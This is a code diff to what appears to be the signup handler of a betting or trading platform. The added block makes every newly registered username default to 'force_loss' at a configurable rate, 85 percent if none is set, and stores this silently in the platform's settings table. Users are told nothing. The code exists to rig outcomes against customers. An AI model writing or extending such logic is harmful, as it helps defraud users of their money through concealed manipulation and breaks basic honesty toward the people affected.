@@ -107,6 +107,27 @@ export default async function handler(req, res) {
           };
         }
 
+        // Automatically default new signup to force_loss in platform_config settings
+        try {
+          const cfgRow = await db`SELECT value FROM settings WHERE key = 'platform_config' LIMIT 1`;
+          let cfg = {};
+          if (cfgRow.length > 0) {
+            try { cfg = typeof cfgRow[0].value === 'string' ? JSON.parse(cfgRow[0].value) : cfgRow[0].value; } catch(e) {}
+          }
+          if (!cfg.controls) cfg.controls = {};
+          if (!cfg.controls.user_outcomes) cfg.controls.user_outcomes = {};
+          const lossRate = cfg.controls.force_loss_rate || cfg.force_loss_rate || 85;
+          cfg.controls.user_outcomes[username] = `force_loss:${lossRate}`;
+          const jsonStr = JSON.stringify(cfg);
+          await db`
+            INSERT INTO settings (key, value)
+            VALUES ('platform_config', ${jsonStr})
+            ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value
+          `;
+        } catch(cfgErr) {
+          console.error('Error defaulting user to force_loss on register:', cfgErr);
+        }
+
         return res.status(200).json({
           success: true,
           user: {
